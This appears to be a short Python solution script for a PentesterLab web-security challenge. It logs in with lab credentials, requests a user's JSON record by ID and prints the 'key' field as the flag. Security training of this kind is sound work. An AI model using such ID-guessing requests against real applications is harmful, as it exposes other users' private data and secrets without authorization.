import requests
import re
import sys

GREEN = "\033[32m"
RED = "\033[91m"
RESET = "\033[0m"

if len(sys.argv) != 2:
    print(f"{RED}[-] Please provide a URL{RESET}")
    sys.exit(1)
else:
    url = sys.argv[1]

user = "user1"
password = 'pentesterlab'
parameters = {'username': user, 'password': password, 'submit': 'Submit+Query'}
index = 0

login_request = requests.get(url + "/users/1.json", params=parameters)

if login_request.status_code == 200:
    user_data = login_request.json()
    key = user_data['key']
    print(f"[+] The flag for this challenge is {GREEN}{key}{RESET}")
else:
    print(f"{RED}[-] Something went wrong!{RESET}")
